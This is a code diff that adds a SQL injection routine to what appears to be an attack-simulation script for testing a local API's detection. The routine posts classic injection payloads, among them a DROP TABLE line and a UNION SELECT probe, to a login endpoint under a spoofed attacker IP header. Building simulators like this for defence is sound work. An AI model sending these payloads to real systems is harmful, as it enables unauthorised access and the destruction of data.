@@ -36,3 +36,25 @@ def endpoint_fuzzing_attack(attempts=30):
         response = requests.get(url, headers=headers)
         print(f"[FUZZING] {path} -> {response.status_code}")
         time.sleep(0.1)
+
+def sql_injection_attack(attempts=20):
+    attacker_ip = "10.0.0.103"
+    headers = {IP_HEADER: attacker_ip}
+
+    sql_payloads = [
+        "admin' OR '1'='1",
+        "' OR 1=1--",
+        "' OR '1'='1' --",
+        "admin'--",
+        "' UNION SELECT NULL--",
+        "'; DROP TABLE users;--",
+
+    ]
+
+    for i in range(attempts):
+        username_payload = random.choice(sql_payloads)
+        password_payload = random.choice(sql_payloads)
+        data = {"username": username_payload, "password": password_payload}
+        response = requests.post(f"{API_URL}/login", data=data, headers=headers)
+        print(f"[SQL INJECTION] {username_payload[:30]} -> {response.status_code}")
+        time.sleep(0.1)
